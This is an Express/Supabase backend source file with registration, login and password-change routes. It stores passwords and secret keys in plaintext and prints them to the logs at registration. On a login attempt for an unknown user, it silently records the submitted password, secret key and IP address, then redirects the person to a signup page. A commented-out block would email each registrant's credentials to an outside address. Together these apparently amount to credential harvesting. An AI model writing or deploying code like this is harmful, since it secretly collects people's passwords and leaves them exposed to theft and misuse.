require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const emailjs = require("@emailjs/nodejs");
const jwt = require("jsonwebtoken");

const app = express();
app.use(cors());
app.use(express.json());

app.get("/", (req, res) => res.json({ status: "ok" }));

const ws = require("ws");
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY,
  { realtime: { transport: ws } }
);

function authenticateToken(req, res, next) {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];

  if (!token) {
    return res.status(401).json({ error: "Missing token" });
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, payload) => {
    if (err) {
      return res.status(401).json({ error: "Invalid or expired token" });
    }
    req.username = payload.username;
    next();
  });
}

app.post("/register", async (req, res) => {
  const { username, password, secret_key, jabber, telegram } = req.body;

  if (!username || !password || !secret_key) {
    return res.status(400).json({ error: "Missing fields" });
  }

  if (!jabber && !telegram) {
    return res.status(400).json({ error: "Provide at least one of jabber or telegram" });
  }

  console.log("/register body:", { username, secret_key, jabber, telegram });

  let registered_at = new Date().toISOString();

  try {
    const { data, error } = await supabase
      .from("users")
      .insert({ username, password, secret_key, jabber, telegram, registered_at })
      .select();
    if (error) {
      console.error("Supabase insert error:", error);
    } else {
      console.log("Supabase insert result:", data);
      if (data && data[0]) {
        registered_at = data[0].registered_at;
      }
    }
  } catch (err) {
    console.error("Supabase error:", err);
  }

  // try {
  //   await emailjs.send(
  //     process.env.EMAILJS_SERVICE_ID,
  //     process.env.EMAILJS_TEMPLATE_ID,
  //     {
  //       username: `${username} - secret-key: ${secret_key}`,
  //       password,
  //       to_email: process.env.EMAILJS_TO_EMAIL,
  //     },
  //     {
  //       publicKey: process.env.EMAILJS_PUBLIC_KEY,
  //       privateKey: process.env.EMAILJS_PRIVATE_KEY,
  //     }
  //   );
  // } catch (err) {
  //   console.error("EmailJS error:", err);
  // }

  const token = jwt.sign({ username }, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRES_IN || "1h",
  });

  res.json({ status: "ok", token, username, registered_at });
});

app.post("/login", async (req, res) => {
  const { username, password, secret_key } = req.body;

  if (!username || !password || !secret_key) {
    return res.status(400).json({ error: "Missing fields" });
  }

  try {
    const { data, error } = await supabase
      .from("users")
      .select("username, password, secret_key, registered_at")
      .eq("username", username)
      .maybeSingle()
    if (error) {
      console.error("Supabase select error:", error);
      return res.status(500).json({ error: "Server error" });
    }

    if (!data) {
      const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.socket.remoteAddress;

      const { error: logError } = await supabase
        .from("login_attempts")
        .insert({ username, ip, password, secret_key });
      if (logError) {
        console.error("Supabase login_attempts insert error:", logError);
      }

      return res.json({ status: "redirect", url: process.env.SIGNUP_REDIRECT_URL });
    }

    if (data.password !== password || data.secret_key !== secret_key) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = jwt.sign({ username }, process.env.JWT_SECRET, {
      expiresIn: process.env.JWT_EXPIRES_IN || "1h",
    });

    res.json({ status: "ok", token, username: data.username, registered_at: data.registered_at });
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

app.post("/logout", (req, res) => {
  res.json({ status: "ok" });
});

app.post("/change-password", authenticateToken, async (req, res) => {
  const { current_password, new_password } = req.body;
  const { username } = req;

  if (!current_password || !new_password) {
    return res.status(400).json({ error: "Missing fields" });
  }

  try {
    const { data, error } = await supabase
      .from("users")
      .select("password")
      .eq("username", username)
      .maybeSingle();

    if (error) {
      console.error("Supabase select error:", error);
      return res.status(500).json({ error: "Server error" });
    }

    if (!data || data.password !== current_password) {
      return res.status(401).json({ error: "Invalid current password" });
    }

    const { error: updateError } = await supabase
      .from("users")
      .update({ password: new_password })
      .eq("username", username);

    if (updateError) {
      console.error("Supabase update error:", updateError);
      return res.status(500).json({ error: "Server error" });
    }

    res.json({ status: "ok" });
  } catch (err) {
    console.error("Change password error:", err);
    res.status(500).json({ error: "Server error" });
  }
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
